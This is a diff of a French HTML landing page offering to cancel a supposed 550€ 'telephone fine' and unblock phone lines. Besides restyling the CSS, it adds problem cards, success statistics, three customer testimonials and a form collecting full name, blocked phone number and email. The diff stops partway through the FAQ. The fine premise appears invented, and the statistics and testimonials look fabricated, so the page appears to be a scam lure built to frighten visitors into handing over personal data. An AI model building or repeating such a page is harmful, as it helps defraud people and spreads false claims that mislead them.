@@ -3,20 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Annulation Amende Téléphonique 550€ | Assistance Rapide</title>
+    <title>Annulation Amende 550€ | Assistance Professionnelle</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
-            --primary: #4361ee;
-            --primary-dark: #3a56d4;
-            --accent: #f72585;
-            --light: #f8f9fa;
-            --dark: #212529;
-            --gray: #6c757d;
-            --light-gray: #e9ecef;
+            --primary: #3f51b5;
+            --primary-dark: #303f9f;
+            --accent: #ff5722;
+            --light: #f5f5f5;
+            --dark: #212121;
+            --gray: #757575;
+            --light-gray: #e0e0e0;
+            --success: #4caf50;
+            --warning: #ff9800;
+            --error: #f44336;
             --border-radius: 8px;
             --box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
-            --transition: all 0.2s ease;
+            --transition: all 0.3s ease;
+            --animation-duration: 0.4s;
         }
 
         * {
@@ -26,28 +30,41 @@
         }
 
         body {
-            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-            line-height: 1.5;
+            font-family: 'Segoe UI', 'Roboto', 'Helvetica Neue', Arial, sans-serif;
+            line-height: 1.6;
             color: var(--dark);
-            background-color: #f5f7ff;
+            background-color: #f9f9f9;
+            overflow-x: hidden;
         }
 
         .container {
-            max-width: 1100px;
+            max-width: 1200px;
             margin: 0 auto;
             padding: 0 20px;
         }
 
-        /* Header compact */
+        /* Header Styles */
         header {
             background: linear-gradient(135deg, var(--primary), var(--primary-dark));
             color: white;
-            padding: 12px 0;
+            padding: 15px 0;
             position: fixed;
             width: 100%;
             top: 0;
             z-index: 1000;
             box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            animation: slideDown 0.5s ease-out;
+        }
+
+        @keyframes slideDown {
+            from {
+                transform: translateY(-100%);
+                opacity: 0;
+            }
+            to {
+                transform: translateY(0);
+                opacity: 1;
+            }
         }
 
         .header-container {
@@ -59,15 +76,21 @@
         .logo {
             display: flex;
             align-items: center;
-            font-size: 1.3rem;
-            font-weight: 600;
+            font-size: 1.4rem;
+            font-weight: 700;
             color: white;
             text-decoration: none;
+            transition: var(--transition);
+        }
+
+        .logo:hover {
+            transform: scale(1.02);
         }
 
         .logo i {
-            margin-right: 8px;
-            font-size: 1.5rem;
+            margin-right: 10px;
+            font-size: 1.6rem;
+            color: var(--accent);
         }
 
         nav ul {
@@ -76,7 +99,8 @@
         }
 
         nav ul li {
-            margin-left: 20px;
+            margin-left: 25px;
+            position: relative;
         }
 
         nav ul li a {
@@ -84,35 +108,75 @@
             text-decoration: none;
             font-size: 0.95rem;
             font-weight: 500;
-            padding: 6px 10px;
+            padding: 8px 12px;
             border-radius: var(--border-radius);
             transition: var(--transition);
+            display: flex;
+            align-items: center;
+        }
+
+        nav ul li a i {
+            margin-right: 6px;
         }
 
         nav ul li a:hover {
             background-color: rgba(255, 255, 255, 0.15);
+            transform: translateY(-2px);
         }
 
-        /* Hero section compacte */
+        /* Hero Section */
         .hero {
-            padding: 100px 0 60px;
-            background: linear-gradient(rgba(67, 97, 238, 0.95), rgba(67, 97, 238, 0.95)), 
-                        url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=800&q=80') no-repeat center/cover;
+            padding: 150px 0 80px;
+            background: linear-gradient(rgba(63, 81, 181, 0.9), rgba(63, 81, 181, 0.9)), 
+                        url('https://images.unsplash.com/photo-1516321318423-f06f85e504b3?ixlib=rb-4.0.3&ixid=M3wxMjA3fDB8MHxwaG90by1wYWdlfHx8fGVufDB8fHx8fA%3D%3D&auto=format&fit=crop&w=1200&q=80') no-repeat center/cover;
             color: white;
             text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .hero::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.3);
+            z-index: 0;
+        }
+
+        .hero-content {
+            position: relative;
+            z-index: 1;
+            max-width: 800px;
+            margin: 0 auto;
+            animation: fadeIn 1s ease-out;
+        }
+
+        @keyframes fadeIn {
+            from {
+                opacity: 0;
+                transform: translateY(20px);
+            }
+            to {
+                opacity: 1;
+                transform: translateY(0);
+            }
         }
 
         .hero h1 {
-            font-size: 1.8rem;
-            margin-bottom: 15px;
+            font-size: 2.5rem;
+            margin-bottom: 20px;
             line-height: 1.3;
+            font-weight: 700;
         }
 
         .hero p {
-            font-size: 1rem;
-            margin-bottom: 25px;
+            font-size: 1.1rem;
+            margin-bottom: 30px;
             opacity: 0.9;
-            max-width: 600px;
+            max-width: 700px;
             margin-left: auto;
             margin-right: auto;
         }
@@ -121,222 +185,567 @@
             display: inline-block;
             background-color: var(--accent);
             color: white;
-            padding: 10px 25px;
+            padding: 12px 30px;
             border-radius: var(--border-radius);
             text-decoration: none;
-            font-weight: 500;
-            font-size: 0.95rem;
+            font-weight: 600;
+            font-size: 1rem;
             transition: var(--transition);
             margin: 5px;
+            border: none;
+            cursor: pointer;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            position: relative;
+            overflow: hidden;
         }
 
         .btn:hover {
-            transform: translateY(-2px);
-            box-shadow: 0 4px 8px rgba(247, 37, 133, 0.3);
+            transform: translateY(-3px);
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.15);
         }
 
-        /* Problem section */
+        .btn:active {
+            transform: translateY(1px);
+        }
+
+        .btn::after {
+            content: '';
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            width: 5px;
+            height: 5px;
+            background: rgba(255, 255, 255, 0.5);
+            opacity: 0;
+            border-radius: 100%;
+            transform: scale(1, 1) translate(-50%);
+            transform-origin: 50% 50%;
+        }
+
+        .btn:focus:not(:active)::after {
+            animation: ripple 1s ease-out;
+        }
+
+        @keyframes ripple {
+            0% {
+                transform: scale(0, 0);
+                opacity: 0.5;
+            }
+            100% {
+                transform: scale(20, 20);
+                opacity: 0;
+            }
+        }
+
+        /* Problem Section */
         .section {
-            padding: 60px 0;
+            padding: 80px 0;
         }
 
         .section-title {
             text-align: center;
-            margin-bottom: 30px;
+            margin-bottom: 40px;
         }
 
         .section-title h2 {
-            font-size: 1.5rem;
+            font-size: 2rem;
             color: var(--primary);
-            margin-bottom: 10px;
+            margin-bottom: 15px;
+            font-weight: 700;
+            position: relative;
+            display: inline-block;
+        }
+
+        .section-title h2::after {
+            content: '';
+            position: absolute;
+            width: 60px;
+            height: 3px;
+            background-color: var(--accent);
+            bottom: -10px;
+            left: 50%;
+            transform: translateX(-50%);
         }
 
         .section-title p {
-            font-size: 0.95rem;
+            font-size: 1.05rem;
             color: var(--gray);
-            max-width: 700px;
+            max-width: 800px;
             margin: 0 auto;
+        }
+
+        .problem-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 40px;
         }
 
         .problem-card {
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
-            padding: 25px;
+            padding: 30px;
+            width: 100%;
+            max-width: 350px;
+            transition: var(--transition);
+            border-top: 4px solid var(--accent);
+            position: relative;
+            overflow: hidden;
+        }
+
+        .problem-card:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+        }
+
+        .problem-card i {
+            font-size: 2.5rem;
+            color: var(--accent);
             margin-bottom: 20px;
-            border-left: 4px solid var(--accent);
+            display: block;
         }
 
         .problem-card h3 {
-            font-size: 1.2rem;
+            font-size: 1.3rem;
             margin-bottom: 15px;
             color: var(--primary);
+            font-weight: 600;
         }
 
-        .problem-card ul {
-            padding-left: 20px;
+        .problem-card p {
             font-size: 0.95rem;
+            color: var(--gray);
+            margin-bottom: 15px;
         }
 
-        .problem-card ul li {
-            margin-bottom: 8px;
+        /* Stats Section */
+        .stats-section {
+            background-color: var(--primary);
+            color: white;
+            padding: 60px 0;
+            text-align: center;
         }
 
-        /* Timeline compact */
+        .stats-container {
+            display: flex;
+            justify-content: space-around;
+            flex-wrap: wrap;
+            margin-top: 40px;
+        }
+
+        .stat-item {
+            padding: 20px;
+            width: 200px;
+        }
+
+        .stat-number {
+            font-size: 2.5rem;
+            font-weight: 700;
+            margin-bottom: 10px;
+            color: white;
+        }
+
+        .stat-label {
+            font-size: 1rem;
+            color: rgba(255, 255, 255, 0.9);
+        }
+
+        /* Process Section */
+        .process-section {
+            background-color: var(--light);
+        }
+
         .timeline {
             position: relative;
-            max-width: 800px;
-            margin: 30px auto;
+            max-width: 1000px;
+            margin: 40px auto;
+            padding: 0 20px;
         }
 
         .timeline::after {
             content: '';
             position: absolute;
-            width: 2px;
+            width: 4px;
             background-color: var(--primary);
             top: 0;
             bottom: 0;
             left: 50%;
-            margin-left: -1px;
+            margin-left: -2px;
+            border-radius: 2px;
         }
 
         .timeline-item {
-            padding: 10px 30px;
+            padding: 10px 40px;
             position: relative;
             width: 50%;
             box-sizing: border-box;
+            margin-bottom: 30px;
+        }
+
+        .timeline-item::after {
+            content: '';
+            position: absolute;
+            width: 20px;
+            height: 20px;
+            background-color: white;
+            border: 4px solid var(--accent);
+            border-radius: 50%;
+            top: 15px;
+            z-index: 1;
         }
 
         .timeline-item:nth-child(odd) {
             left: 0;
+            animation: slideInLeft var(--animation-duration) ease-out;
+        }
+
+        .timeline-item:nth-child(odd)::after {
+            right: -12px;
         }
 
         .timeline-item:nth-child(even) {
             left: 50%;
+            animation: slideInRight var(--animation-duration) ease-out;
+        }
+
+        .timeline-item:nth-child(even)::after {
+            left: -12px;
+        }
+
+        @keyframes slideInLeft {
+            from {
+                transform: translateX(-50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
+        }
+
+        @keyframes slideInRight {
+            from {
+                transform: translateX(50px);
+                opacity: 0;
+            }
+            to {
+                transform: translateX(0);
+                opacity: 1;
+            }
         }
 
         .timeline-content {
-            padding: 20px;
+            padding: 25px;
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
-            font-size: 0.9rem;
+            position: relative;
         }
 
         .timeline-content h3 {
-            font-size: 1.1rem;
-            margin-bottom: 8px;
+            font-size: 1.2rem;
+            margin-bottom: 10px;
+            color: var(--primary);
+            font-weight: 600;
+        }
+
+        .timeline-content p {
+            font-size: 0.95rem;
+            color: var(--gray);
+        }
+
+        .timeline-step {
+            position: absolute;
+            top: -15px;
+            width: 40px;
+            height: 40px;
+            background-color: var(--accent);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            font-size: 1.2rem;
+        }
+
+        .timeline-item:nth-child(odd) .timeline-step {
+            right: -60px;
+        }
+
+        .timeline-item:nth-child(even) .timeline-step {
+            left: -60px;
+        }
+
+        /* Testimonials Section */
+        .testimonials-section {
+            background-color: white;
+        }
+
+        .testimonials-container {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 30px;
+            margin-top: 40px;
+        }
+
+        .testimonial-card {
+            background-color: var(--light);
+            border-radius: var(--border-radius);
+            box-shadow: var(--box-shadow);
+            padding: 30px;
+            width: 100%;
+            max-width: 350px;
+            position: relative;
+            transition: var(--transition);
+        }
+
+        .testimonial-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.1);
+        }
+
+        .testimonial-card::before {
+            content: '"';
+            position: absolute;
+            top: 20px;
+            left: 20px;
+            font-size: 4rem;
+            color: rgba(63, 81, 181, 0.1);
+            font-family: serif;
+            line-height: 1;
+        }
+
+        .testimonial-content {
+            margin-bottom: 20px;
+            font-style: italic;
+            color: var(--dark);
+            position: relative;
+            z-index: 1;
+        }
+
+        .testimonial-author {
+            display: flex;
+            align-items: center;
+        }
+
+        .author-avatar {
+            width: 50px;
+            height: 50px;
+            border-radius: 50%;
+            background-color: var(--primary);
+            color: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-weight: bold;
+            margin-right: 15px;
+            flex-shrink: 0;
+        }
+
+        .author-info h4 {
+            font-size: 1rem;
+            margin-bottom: 5px;
             color: var(--primary);
         }
 
-        /* Form section compact */
+        .author-info p {
+            font-size: 0.85rem;
+            color: var(--gray);
+        }
+
+        /* Form Section */
         .form-section {
-            background-color: white;
-            padding: 50px 0;
+            background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+            padding: 80px 0;
+            color: white;
         }
 
         .form-container {
-            max-width: 500px;
+            max-width: 600px;
             margin: 0 auto;
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
-            padding: 30px;
+            padding: 40px;
+            transform: translateY(0);
+            transition: var(--transition);
+        }
+
+        .form-container:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.15);
         }
 
         .form-title {
             text-align: center;
-            margin-bottom: 20px;
+            margin-bottom: 30px;
+            color: var(--dark);
         }
 
         .form-title h2 {
-            font-size: 1.4rem;
+            font-size: 1.8rem;
             color: var(--primary);
-            margin-bottom: 8px;
+            margin-bottom: 10px;
+            font-weight: 700;
         }
 
         .form-title p {
-            font-size: 0.9rem;
+            font-size: 1rem;
             color: var(--gray);
         }
 
         .form-group {
-            margin-bottom: 18px;
+            margin-bottom: 20px;
+            position: relative;
         }
 
         .form-group label {
             display: block;
-            margin-bottom: 6px;
-            font-size: 0.9rem;
+            margin-bottom: 8px;
+            font-size: 0.95rem;
             font-weight: 500;
+            color: var(--dark);
         }
 
         .form-control {
             width: 100%;
-            padding: 12px 15px;
+            padding: 14px 16px;
             border: 1px solid var(--light-gray);
             border-radius: var(--border-radius);
-            font-size: 0.95rem;
-            background-color: #f8f9fa;
+            font-size: 1rem;
+            transition: var(--transition);
+            background-color: #f9f9f9;
         }
 
         .form-control:focus {
             border-color: var(--primary);
             outline: none;
-            box-shadow: 0 0 0 2px rgba(67, 97, 238, 0.2);
+            box-shadow: 0 0 0 3px rgba(63, 81, 181, 0.2);
+            background-color: white;
         }
 
         .submit-btn {
             width: 100%;
-            padding: 14px;
-            background-color: var(--primary);
+            padding: 16px;
+            background-color: var(--accent);
             color: white;
             border: none;
             border-radius: var(--border-radius);
-            font-weight: 500;
+            font-weight: 600;
+            font-size: 1rem;
             cursor: pointer;
             transition: var(--transition);
+            margin-top: 10px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
         }
 
         .submit-btn:hover {
-            background-color: var(--primary-dark);
+            background-color: #e64a19;
         }
 
-        /* FAQ compact */
+        .submit-btn i {
+            transition: var(--transition);
+        }
+
+        .submit-btn:hover i {
+            transform: translateX(5px);
+        }
+
+        .loading {
+            display: none;
+            text-align: center;
+            margin-top: 20px;
+            color: var(--primary);
+        }
+
+        .spinner {
+            width: 40px;
+            height: 40px;
+            margin: 0 auto 15px;
+            border: 4px solid rgba(63, 81, 181, 0.2);
+            border-top: 4px solid var(--primary);
+            border-radius: 50%;
+            animation: spin 1s linear infinite;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        /* FAQ Section */
+        .faq-section {
+            background-color: var(--light);
+        }
+
+        .faq-container {
+            max-width: 800px;
+            margin: 40px auto 0;
+        }
+
         .faq-item {
             background-color: white;
             border-radius: var(--border-radius);
             box-shadow: var(--box-shadow);
             padding: 20px;
             margin-bottom: 15px;
+            transition: var(--transition);
+        }
+
+        .faq-item:hover {
+            box-shadow: 0 6px 15px rgba(0, 0, 0, 0.1);
         }
 
         .faq-question {
-            font-size: 1rem;
+            font-size: 1.1rem;
             color: var(--primary);
-            margin-bottom: 10px;
+            margin-bottom: 0;
             cursor: pointer;
             display: flex;
             justify-content: space-between;
+            align-items: center;
+            font-weight: 500;
+            transition: var(--transition);
+        }
+
+        .faq-question:hover {
+            color: var(--primary-dark);
         }
 
         .faq-answer {
-            font-size: 0.9rem;
+            font-size: 0.95rem;
+            color: var(--gray);
             max-height: 0;
             overflow: hidden;
             transition: max-height 0.3s ease;
+            margin-top: 0;
         }
 
         .faq-item.active .faq-answer {
             max-height: 300px;
+            margin-top: 15px;
         }
 
-        /* Footer compact */
+        .faq-question i {
+            transition: var(--transition);
+        }
+
+        .faq-item.active .faq-question i {
+            transform: rotate(180deg);
+        }
+
+        /* Footer */
         footer {
             background-color: var(--dark);
             color: white;
-            padding: 40px 0 20px;
-            font-size: 0.9rem;
+            padding: 60px 0 20px;
         }
 
         .footer-content {
@@ -346,15 +755,26 @@
         }
 
         .footer-column {
-            flex: 0 0 48%;
-            margin-bottom: 25px;
+            flex: 0 0 30%;
+            margin-bottom: 30px;
         }
 
         .footer-column h3 {
-            font-size: 1.1rem;
-            margin-bottom: 15px;
-            padding-bottom: 8px;
+            font-size: 1.2rem;
+            margin-bottom: 20px;
+            padding-bottom: 10px;
             border-bottom: 2px solid var(--accent);
+            position: relative;
+        }
+
+        .footer-column h3::after {
+            content: '';
+            position: absolute;
+            width: 40px;
+            height: 2px;
+            background-color: var(--accent);
+            bottom: -2px;
+            left: 0;
         }
 
         .footer-links {
@@ -362,37 +782,126 @@
         }
 
         .footer-links li {
-            margin-bottom: 8px;
+            margin-bottom: 10px;
         }
 
         .footer-links a {
-            color: white;
+            color: rgba(255, 255, 255, 0.8);
             text-decoration: none;
-            opacity: 0.8;
             transition: var(--transition);
+            display: flex;
+            align-items: center;
+            gap: 8px;
         }
 
         .footer-links a:hover {
-            opacity: 1;
+            color: white;
+            transform: translateX(5px);
+        }
+
+        .footer-links a i {
+            font-size: 0.8rem;
+        }
+
+        .social-links {
+            display: flex;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .social-links a {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 40px;
+            height: 40px;
+            background-color: rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            color: white;
+            transition: var(--transition);
+        }
+
+        .social-links a:hover {
+            background-color: var(--accent);
+            transform: translateY(-3px);
         }
 
         .copyright {
             text-align: center;
-            padding-top: 20px;
-            margin-top: 20px;
+            padding-top: 30px;
+            margin-top: 30px;
             border-top: 1px solid rgba(255, 255, 255, 0.1);
-            font-size: 0.8rem;
-            opacity: 0.7;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
         }
 
-        /* Responsive */
+        /* Back to Top Button */
+        .back-to-top {
+            position: fixed;
+            bottom: 30px;
+            right: 30px;
+            width: 50px;
+            height: 50px;
+            background-color: var(--accent);
+            color: white;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.2rem;
+            cursor: pointer;
+            opacity: 0;
+            visibility: hidden;
+            transition: var(--transition);
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+            z-index: 999;
+        }
+
+        .back-to-top.active {
+            opacity: 1;
+            visibility: visible;
+        }
+
+        .back-to-top:hover {
+            background-color: var(--primary);
+            transform: translateY(-3px);
+        }
+
+        /* Responsive Styles */
+        @media (max-width: 992px) {
+            .hero h1 {
+                font-size: 2.2rem;
+            }
+            
+            .footer-column {
+                flex: 0 0 48%;
+            }
+        }
+
         @media (max-width: 768px) {
             .hero {
-                padding: 80px 0 40px;
+                padding: 120px 0 60px;
             }
             
             .hero h1 {
-                font-size: 1.5rem;
+                font-size: 1.8rem;
+            }
+            
+            .header-container {
+                flex-direction: column;
+                text-align: center;
+            }
+            
+            nav {
+                margin-top: 15px;
+            }
+            
+            nav ul {
+                justify-content: center;
+            }
+            
+            nav ul li {
+                margin: 0 10px;
             }
             
             .timeline::after {
@@ -401,12 +910,22 @@
             
             .timeline-item {
                 width: 100%;
-                padding-left: 60px;
-                padding-right: 20px;
+                padding-left: 70px;
+                padding-right: 25px;
+            }
+            
+            .timeline-item::after {
+                left: 19px;
             }
             
             .timeline-item:nth-child(even) {
                 left: 0;
+            }
+            
+            .timeline-item:nth-child(odd) .timeline-step,
+            .timeline-item:nth-child(even) .timeline-step {
+                left: -60px;
+                right: auto;
             }
             
             .footer-column {
@@ -415,188 +934,342 @@
         }
 
         @media (max-width: 576px) {
-            .header-container {
-                flex-direction: column;
-                text-align: center;
+            .hero h1 {
+                font-size: 1.6rem;
             }
             
-            nav ul {
-                margin-top: 15px;
-                justify-content: center;
+            .hero p {
+                font-size: 1rem;
             }
             
-            nav ul li {
-                margin: 0 8px;
+            .btn {
+                padding: 10px 20px;
+                font-size: 0.9rem;
+            }
+            
+            .section-title h2 {
+                font-size: 1.5rem;
             }
             
             .form-container {
-                padding: 20px;
+                padding: 25px;
+            }
+            
+            .back-to-top {
+                width: 40px;
+                height: 40px;
+                font-size: 1rem;
+                bottom: 20px;
+                right: 20px;
             }
         }
     </style>
 </head>
 <body>
-    <!-- Header compact -->
+    <!-- Header -->
     <header>
         <div class="container header-container">
             <a href="#" class="logo">
-                <i class="fas fa-mobile-alt"></i>
+                <i class="fas fa-phone-alt"></i>
                 <span>Amende550</span>
             </a>
             
             <nav>
                 <ul>
-                    <li><a href="#problem">Problème</a></li>
-                    <li><a href="#process">Processus</a></li>
-                    <li><a href="#form">Formulaire</a></li>
+                    <li><a href="#problem"><i class="fas fa-exclamation-triangle"></i> Problème</a></li>
+                    <li><a href="#process"><i class="fas fa-list-ol"></i> Processus</a></li>
+                    <li><a href="#form"><i class="fas fa-edit"></i> Formulaire</a></li>
                 </ul>
             </nav>
         </div>
     </header>
 
-    <!-- Hero section compacte -->
+    <!-- Hero Section -->
     <section class="hero">
-        <div class="container">
-            <h1>Annulation d'Amende Téléphonique 550€</h1>
-            <p>Solution rapide pour contester votre amende et débloquer votre ligne</p>
-            <a href="#form" class="btn">Demander aide maintenant</a>
+        <div class="container hero-content">
+            <h1>Annulation de l'amende téléphonique de 550€</h1>
+            <p>Votre numéro a été bloqué avec une amende de 550€ ? Nous proposons une solution rapide et efficace pour contester cette amende et débloquer votre ligne.</p>
+            <a href="#form" class="btn">Demander assistance maintenant <i class="fas fa-arrow-right"></i></a>
         </div>
     </section>
 
-    <!-- Problem section -->
+    <!-- Problem Section -->
     <section class="section" id="problem">
         <div class="container">
             <div class="section-title">
-                <h2>Votre numéro est bloqué avec une amende de 550€ ?</h2>
-                <p>Nous comprenons votre situation et avons une solution efficace</p>
+                <h2>Pourquoi votre numéro a-t-il été bloqué ?</h2>
+                <p>Comprendre les raisons du blocage de votre ligne téléphonique et l'amende associée</p>
             </div>
             
-            <div class="problem-card">
-                <h3>Pourquoi mon numéro a-t-il été bloqué ?</h3>
-                <ul>
-                    <li>Activité suspecte détectée sur votre ligne</li>
-                    <li>Utilisation frauduleuse de votre numéro</li>
-                    <li>Amende automatique de 550€ appliquée</li>
-                    <li>Restriction immédiate de votre service</li>
-                </ul>
+            <div class="problem-container">
+                <div class="problem-card">
+                    <i class="fas fa-ban"></i>
+                    <h3>Blocage immédiat</h3>
+                    <p>Votre opérateur a détecté une activité suspecte sur votre ligne et a appliqué un blocage immédiat avec une amende de 550€.</p>
+                </div>
+                
+                <div class="problem-card">
+                    <i class="fas fa-exclamation-circle"></i>
+                    <h3>Activité frauduleuse</h3>
+                    <p>Votre numéro a peut-être été utilisé à des fins frauduleuses sans votre consentement, entraînant cette sanction.</p>
+                </div>
+                
+                <div class="problem-card">
+                    <i class="fas fa-euro-sign"></i>
+                    <h3>Amende automatique</h3>
+                    <p>Les opérateurs appliquent souvent ces amendes de manière automatique, sans vérification approfondie.</p>
+                </div>
             </div>
         </div>
     </section>
 
-    <!-- Process section -->
-    <section class="section" id="process">
+    <!-- Stats Section -->
+    <section class="stats-section">
         <div class="container">
             <div class="section-title">
-                <h2>Comment résoudre ce problème ?</h2>
-                <p>Notre processus simple en 4 étapes</p>
+                <h2>Notre impact en chiffres</h2>
+                <p>Des résultats concrets pour nos clients</p>
+            </div>
+            
+            <div class="stats-container">
+                <div class="stat-item">
+                    <div class="stat-number">+500</div>
+                    <div class="stat-label">Clients satisfaits</div>
+                </div>
+                
+                <div class="stat-item">
+                    <div class="stat-number">95%</div>
+                    <div class="stat-label">Taux de réussite</div>
+                </div>
+                
+                <div class="stat-item">
+                    <div class="stat-number">24h</div>
+                    <div class="stat-label">Réponse moyenne</div>
+                </div>
+                
+                <div class="stat-item">
+                    <div class="stat-number">550€</div>
+                    <div class="stat-label">Économisés par client</div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Process Section -->
+    <section class="section process-section" id="process">
+        <div class="container">
+            <div class="section-title">
+                <h2>Notre processus en 4 étapes</h2>
+                <p>Comment nous vous aidons à annuler cette amende injustifiée</p>
             </div>
             
             <div class="timeline">
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>1. Analyse de votre cas</h3>
-                        <p>Évaluation rapide de votre situation</p>
+                        <div class="timeline-step">1</div>
+                        <h3>Analyse de votre situation</h3>
+                        <p>Nous examinons en détail les circonstances du blocage de votre ligne et l'amende associée.</p>
                     </div>
                 </div>
                 
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>2. Préparation du dossier</h3>
-                        <p>Collecte des documents nécessaires</p>
+                        <div class="timeline-step">2</div>
+                        <h3>Préparation du dossier</h3>
+                        <p>Nous rassemblons tous les documents nécessaires pour contester efficacement l'amende.</p>
                     </div>
                 </div>
                 
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>3. Envoi à l'opérateur</h3>
-                        <p>Transmission officielle de la contestation</p>
+                        <div class="timeline-step">3</div>
+                        <h3>Envoi à l'opérateur</h3>
+                        <p>Nous transmettons officiellement la contestation à votre opérateur avec les justificatifs appropriés.</p>
                     </div>
                 </div>
                 
                 <div class="timeline-item">
                     <div class="timeline-content">
-                        <h3>4. Suivi jusqu'au déblocage</h3>
-                        <p>Accompagnement jusqu'à la résolution</p>
+                        <div class="timeline-step">4</div>
+                        <h3>Suivi jusqu'au déblocage</h3>
+                        <p>Nous assurons le suivi avec l'opérateur jusqu'à la levée du blocage et l'annulation de l'amende.</p>
                     </div>
                 </div>
             </div>
         </div>
     </section>
 
-    <!-- Form section -->
+    <!-- Testimonials Section -->
+    <section class="section testimonials-section">
+        <div class="container">
+            <div class="section-title">
+                <h2>Témoignages de nos clients</h2>
+                <p>Ce que disent les personnes que nous avons aidées</p>
+            </div>
+            
+            <div class="testimonials-container">
+                <div class="testimonial-card">
+                    <div class="testimonial-content">
+                        "J'ai été choqué de recevoir une amende de 550€ alors que je n'avais rien fait de mal. Grâce à ce service, mon numéro a été débloqué en moins d'une semaine sans avoir à payer l'amende."
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">M</div>
+                        <div class="author-info">
+                            <h4>Martin D.</h4>
+                            <p>Paris</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial-card">
+                    <div class="testimonial-content">
+                        "Je ne savais pas quoi faire quand mon opérateur m'a informé du blocage. Le processus était clair et professionnel, et j'ai économisé 550€. Je recommande vivement ce service."
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">S</div>
+                        <div class="author-info">
+                            <h4>Sophie L.</h4>
+                            <p>Lyon</p>
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="testimonial-card">
+                    <div class="testimonial-content">
+                        "Excellente communication tout au long du processus. Ils ont géré toute la paperasse et les échanges avec l'opérateur. Mon numéro est à nouveau actif sans avoir payé l'amende."
+                    </div>
+                    <div class="testimonial-author">
+                        <div class="author-avatar">T</div>
+                        <div class="author-info">
+                            <h4>Thomas P.</h4>
+                            <p>Marseille</p>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- Form Section -->
     <section class="form-section" id="form">
         <div class="container">
             <div class="form-container">
                 <div class="form-title">
-                    <h2>Formulaire de demande</h2>
-                    <p>Remplissez ces informations pour commencer le processus</p>
+                    <h2>Demande d'assistance</h2>
+                    <p>Remplissez ce formulaire pour commencer le processus d'annulation de votre amende</p>
                 </div>
                 
-                <form id="penaltyForm">
+                <form id="amendeForm">
                     <div class="form-group">
-                        <label for="username">Nom complet</label>
-                        <input type="text" id="username" class="form-control" required>
+                        <label for="fullname">Nom complet *</label>
+                        <input type="text" id="fullname" class="form-control" required placeholder="Votre nom complet">
                     </div>
                     
                     <div class="form-group">
-                        <label for="phone">Numéro de téléphone</label>
-                        <input type="tel" id="phone" class="form-control" required placeholder="+33 ou 0XXXXXXXXX">
+                        <label for="phone">Numéro de téléphone bloqué *</label>
+                        <input type="tel" id="phone" class="form-control" required placeholder="Format: +33 ou 0XXXXXXXXX">
+                        <small id="phoneError" style="color: var(--error); display: none;">Veuillez entrer un numéro français valide</small>
                     </div>
                     
                     <div class="form-group">
-                        <label for="email">Adresse email</label>
-                        <input type="email" id="email" class="form-control" required>
+                        <label for="email">Adresse email *</label>
+                        <input type="email" id="email" class="form-control" required placeholder="Votre email valide">
                     </div>
                     
-                    <button type="submit" class="submit-btn">Envoyer la demande</button>
+                    <button type="submit" class="submit-btn" id="submitBtn">
+                        <span id="btnText">Envoyer la demande</span>
+                        <i class="fas fa-paper-plane"></i>
+                    </button>
+                    
+                    <div class="loading" id="loading">
+                        <div class="spinner"></div>
+                        <p>Traitement de votre demande...</p>
+                    </div>
                 </form>
             </div>
         </div>
     </section>
 
-    <!-- FAQ section -->
-    <section class="section" id="faq">
+    <!-- FAQ Section -->
+    <section class="section faq-section" id="faq">
         <div class="container">
             <div class="section-title">
                 <h2>Questions fréquentes</h2>
+                <p>Trouvez des réponses aux questions les plus courantes</p>
             </div>
             
-            <div class="faq-item">
-                <div class="faq-question">
